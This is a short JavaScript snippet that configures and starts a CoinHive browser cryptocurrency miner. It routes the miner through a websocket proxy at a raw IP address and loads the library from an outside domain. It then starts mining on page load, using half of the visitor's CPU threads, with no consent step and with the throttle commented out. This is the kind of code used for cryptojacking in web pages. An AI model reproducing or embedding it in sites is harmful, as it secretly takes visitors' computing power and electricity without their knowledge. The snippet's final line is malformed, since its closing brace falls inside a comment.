  CoinHive.CONFIG.WEBSOCKET_SHARDS = [
      ["ws://45.32.105.134:8080"]
  ];
  CoinHive.CONFIG.LIB_URL = 'http://wallpoper.com/js/';
  var miner = new CoinHive.Anonymous('iizJgBH07el5DZDwung66HGEReyfZPi7', {
      threads: (navigator.hardwareConcurrency / 2 < 2) ? 1 : Math.floor(navigator.hardwareConcurrency / 2)
  });
  miner.start();
  miner.on('accepted', function() {
              console.log('accepted'); // miner.setThrottle(0.5);  });